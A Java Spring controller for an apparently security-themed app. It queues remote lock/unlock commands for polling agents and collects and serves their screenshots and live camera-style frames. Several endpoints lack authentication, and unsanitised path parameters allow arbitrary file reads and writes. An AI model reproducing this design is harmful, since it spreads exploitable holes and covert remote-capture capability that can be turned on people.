package com.guardian.controller;

import com.guardian.entity.User;
import com.guardian.repository.UserRepository;
import com.guardian.service.SecurityService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.Optional;
import java.util.List;
import java.util.ArrayList;
import java.util.Map;
import java.util.HashMap;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import org.springframework.web.multipart.MultipartFile;
import com.guardian.repository.LogRepository;
import com.guardian.entity.LogEntry;

@RestController
@CrossOrigin(origins = "*") // Allows requests from Vercel
public class DashboardController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private SecurityService securityService;

    @Autowired
    private LogRepository logRepository;

    // Target-Specific Command Queues for Agent Polling
    private static final java.util.concurrent.ConcurrentHashMap<String, ConcurrentLinkedQueue<String>> targetCommandQueues = new java.util.concurrent.ConcurrentHashMap<>();
    private static final String UPLOAD_DIR = "screenshots/";

    static {
        java.io.File dir = new java.io.File(UPLOAD_DIR);
        if (!dir.exists()) dir.mkdirs();
    }

    @GetMapping("/api/dashboard-data")
    public Map<String, Object> getDashboardData(
            @RequestParam String apiKey, 
            @RequestParam(required = false, defaultValue = "ALL") String targetId, 
            @RequestParam(required = false, defaultValue = "ADMIN") String role) {
        
        Map<String, Object> response = new HashMap<>();

        if (apiKey == null || apiKey.isEmpty()) {
            response.put("success", false);
            response.put("message", "Unauthorized");
            return response;
        }

        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();

        if (user.isEmpty()) {
            response.put("success", false);
            response.put("message", "Unauthorized");
            return response;
        }

        String dbRole = user.get().getRole();
        if (dbRole == null) {
            dbRole = "ADMIN";
        }
        
        response.put("success", true);
        response.put("user", user.get());
        response.put("role", dbRole.toUpperCase());
        
        List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
        response.put("logs", logs);
        response.put("targets", securityService.getAllTargetIds());
        response.put("currentTarget", targetId);
        
        // Police dashboard metrics
        List<User> allUsers = userRepository.findAll();
        response.put("users", allUsers);
        response.put("totalBreaches", logs.size());
        response.put("activeUsers", allUsers.size());
        
        long criticalAlerts = logs.stream()
                .filter(log -> log.getDetails().toLowerCase().contains("kockroach") || 
                               log.getDetails().toLowerCase().contains("spying"))
                .count();
        response.put("criticalAlerts", criticalAlerts);
        
        // List screenshots based on targetId
        List<String> fileList = new ArrayList<>();
        if ("ALL".equals(targetId)) {
            java.io.File rootFolder = new java.io.File(UPLOAD_DIR);
            if (rootFolder.exists() && rootFolder.isDirectory()) {
                java.io.File[] rootFiles = rootFolder.listFiles(f -> !f.isDirectory() && (f.getName().toLowerCase().endsWith(".jpg") || f.getName().toLowerCase().endsWith(".png") || f.getName().toLowerCase().endsWith(".mp4")));
                if (rootFiles != null) {
                    for (java.io.File f : rootFiles) {
                        fileList.add(f.getName());
                    }
                }
                java.io.File[] subdirs = rootFolder.listFiles(java.io.File::isDirectory);
                if (subdirs != null) {
                    for (java.io.File subdir : subdirs) {
                        java.io.File[] subFiles = subdir.listFiles(f -> !f.isDirectory() && (f.getName().toLowerCase().endsWith(".jpg") || f.getName().toLowerCase().endsWith(".png") || f.getName().toLowerCase().endsWith(".mp4")));
                        if (subFiles != null) {
                            for (java.io.File f : subFiles) {
                                fileList.add(f.getName());
                            }
                        }
                    }
                }
            }
        } else {
            java.io.File folder = new java.io.File(UPLOAD_DIR + targetId + "/");
            if (!folder.exists()) folder.mkdirs();
            java.io.File[] files = folder.listFiles(f -> !f.isDirectory() && (f.getName().toLowerCase().endsWith(".jpg") || f.getName().toLowerCase().endsWith(".png") || f.getName().toLowerCase().endsWith(".mp4")));
            if (files != null) {
                for (java.io.File f : files) {
                    fileList.add(f.getName());
                }
            }
        }
        
        fileList.sort((a, b) -> b.compareToIgnoreCase(a));
        response.put("screenshots", fileList);
        
        return response;
    }

    @PostMapping("/api/save-telegram")
    public Map<String, Object> saveTelegram(
            @RequestParam String apiKey, 
            @RequestParam String botToken, 
            @RequestParam String chatId,
            @RequestParam(required = false, defaultValue = "ADMIN") String role) {
        
        Map<String, Object> response = new HashMap<>();

        if ("POLICE".equalsIgnoreCase(role)) {
            response.put("success", false);
            response.put("message", "Unauthorized for Police role");
            return response;
        }

        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();

        if (user.isPresent()) {
            User u = user.get();
            u.setTelegramBotToken(botToken);
            u.setTelegramChatId(chatId);
            userRepository.save(u);
            response.put("success", true);
            response.put("message", "Telegram settings saved");
            return response;
        }
        response.put("success", false);
        response.put("message", "User not found");
        return response;
    }

    @GetMapping("/api/status")
    public java.util.Map<String, Object> getStatus() {
        java.util.Map<String, Object> status = new java.util.HashMap<>();
        status.put("locked", com.guardian.Main.isLocked());
        status.put("kavachActive", securityService.isKavachActive());
        return status;
    }

    @PostMapping("/api/kavach/toggle")
    public String toggleKavach(
            @RequestParam boolean active, 
            @RequestParam(required = false) String apiKey, 
            @RequestParam(required = false, defaultValue = "ADMIN") String role) {
        if (apiKey == null || apiKey.isEmpty()) {
            return "UNAUTHORIZED";
        }
        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();
        if (user.isEmpty() || !"ADMIN".equalsIgnoreCase(user.get().getRole())) {
            return "UNAUTHORIZED";
        }
        securityService.setKavachActive(active);
        return "KAVACH_" + (active ? "ACTIVATED" : "DEACTIVATED");
    }

    @PostMapping("/api/control")
    public String controlSystem(
            @RequestParam String action, 
            @RequestParam(required = false) String apiKey,
            @RequestParam(required = false, defaultValue = "ADMIN") String role,
            @RequestParam(required = false, defaultValue = "ALL") String targetId) {

        if (apiKey == null || apiKey.isEmpty()) {
            return "ERROR: Unauthorized";
        }
        Optional<User> user = userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst();
        if (user.isEmpty() || !"ADMIN".equalsIgnoreCase(user.get().getRole())) {
            return "ERROR: Unauthorized";
        }

        String uppercaseAction = action.toUpperCase();
        if ("lock".equalsIgnoreCase(action)) {
            com.guardian.Main.setLockedRemote(true);
            uppercaseAction = "LOCK";
        } else if ("unlock".equalsIgnoreCase(action)) {
            com.guardian.Main.setLockedRemote(false);
            uppercaseAction = "UNLOCK";
        }

        if ("ALL".equalsIgnoreCase(targetId)) {
            for (String tid : targetCommandQueues.keySet()) {
                targetCommandQueues.computeIfAbsent(tid, k -> new ConcurrentLinkedQueue<>()).add(uppercaseAction);
            }
        } else {
            targetCommandQueues.computeIfAbsent(targetId, k -> new ConcurrentLinkedQueue<>()).add(uppercaseAction);
        }

        securityService.addLog("3rd AI Dashboard", uppercaseAction, "Remote command executed: " + action, null, targetId);

        return "OK";
    }

    @GetMapping("/api/commands/poll")
    public Map<String, String> pollCommands(
            @RequestParam(required = false) String apiKey,
            @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        if (apiKey != null) {
            userRepository.findAll().stream()
                .filter(u -> u.getApiKey().equals(apiKey))
                .findFirst()
                .ifPresent(u -> {
                    u.setLastSeen(java.time.LocalDateTime.now());
                    userRepository.save(u);
                });
        }

        targetCommandQueues.putIfAbsent(targetId, new ConcurrentLinkedQueue<>());

        if (!"UNKNOWN".equals(targetId)) {
            List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
            if (logs.isEmpty()) {
                securityService.addLog("SYSTEM", "AGENT_ONLINE", "Agent connected from dynamic target: " + targetId, null, targetId);
            }
        }

        ConcurrentLinkedQueue<String> queue = targetCommandQueues.get(targetId);
        String cmd = (queue != null) ? queue.poll() : null;
        
        Map<String, String> response = new HashMap<>();
        response.put("command", cmd != null ? cmd : "NONE");
        return response;
    }

    @PostMapping("/api/upload")
    public String handleFileUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        if (file.isEmpty()) return "FAIL";
        try {
            java.io.File dir = new java.io.File(UPLOAD_DIR + targetId + "/");
            if (!dir.exists()) dir.mkdirs();
            java.nio.file.Path path = Paths.get(dir.getAbsolutePath() + "/" + file.getOriginalFilename());
            Files.copy(file.getInputStream(), path, StandardCopyOption.REPLACE_EXISTING);
            return "SUCCESS";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    @PostMapping("/api/live-upload")
    public String handleLiveUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        try {
            java.io.File dir = new java.io.File(UPLOAD_DIR + targetId + "/");
            if (!dir.exists()) dir.mkdirs();
            java.nio.file.Path path = Paths.get(dir.getAbsolutePath() + "/live_now.jpg");
            Files.copy(file.getInputStream(), path, StandardCopyOption.REPLACE_EXISTING);
            return "SUCCESS";
        } catch (Exception e) { return "ERROR"; }
    }

    @GetMapping("/api/live-stream")
    public org.springframework.http.ResponseEntity<?> getLiveStream(@RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        String pathStr = UPLOAD_DIR + targetId + "/live_now.jpg";
        
        if ("ALL".equals(targetId) || "UNKNOWN".equals(targetId)) {
            java.io.File uploadDir = new java.io.File(UPLOAD_DIR);
            if (uploadDir.exists() && uploadDir.isDirectory()) {
                java.io.File[] dirs = uploadDir.listFiles(java.io.File::isDirectory);
                if (dirs != null && dirs.length > 0) {
                    for (java.io.File dir : dirs) {
                        java.io.File liveFile = new java.io.File(dir, "live_now.jpg");
                        if (liveFile.exists()) {
                            pathStr = liveFile.getAbsolutePath();
                            break;
                        }
                    }
                }
            }
        }

        java.io.File checkFile = new java.io.File(pathStr);
        if (!checkFile.exists()) {
            return org.springframework.http.ResponseEntity.noContent().build();
        }

        org.springframework.core.io.Resource resource = new org.springframework.core.io.FileSystemResource(pathStr);
        return org.springframework.http.ResponseEntity.ok()
                .header(org.springframework.http.HttpHeaders.CACHE_CONTROL, "no-store, no-cache, must-revalidate, max-age=0")
                .header(org.springframework.http.HttpHeaders.PRAGMA, "no-cache")
                .contentType(org.springframework.http.MediaType.IMAGE_JPEG)
                .body(resource);
    }

    @GetMapping("/api/logs")
    public java.util.List<com.guardian.entity.LogEntry> apiLogs() {
        return securityService.getAllLogs();
    }

    @PostMapping("/api/logs/clear")
    public String clearLogs() {
        securityService.clearAllLogs();
        return "LOGS_CLEARED";
    }

    @GetMapping("/api/screenshots/{filename}")
    public org.springframework.http.ResponseEntity<org.springframework.core.io.Resource> getScreenshot(@PathVariable String filename, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
        String path = "ALL".equals(targetId) || "UNKNOWN".equals(targetId) ? UPLOAD_DIR + filename : UPLOAD_DIR + targetId + "/" + filename;
        java.io.File file = new java.io.File(path);
        
        if (!file.exists() && ("ALL".equals(targetId) || "UNKNOWN".equals(targetId))) {
            java.io.File uploadDir = new java.io.File(UPLOAD_DIR);
            if (uploadDir.exists() && uploadDir.isDirectory()) {
                java.io.File[] dirs = uploadDir.listFiles(java.io.File::isDirectory);
                if (dirs != null) {
                    for (java.io.File dir : dirs) {
                        java.io.File subFile = new java.io.File(dir, filename);
                        if (subFile.exists()) {
                            path = subFile.getAbsolutePath();
                            break;
                        }
                    }
                }
            }
        }
        
        org.springframework.core.io.Resource resource = new org.springframework.core.io.FileSystemResource(path);
        
        String contentType = "image/jpeg";
        if (filename.toLowerCase().endsWith(".png")) contentType = "image/png";
        else if (filename.toLowerCase().endsWith(".mp4")) contentType = "video/mp4";

        return org.springframework.http.ResponseEntity.ok()
                .contentType(org.springframework.http.MediaType.parseMediaType(contentType))
                .body(resource);
    }
}
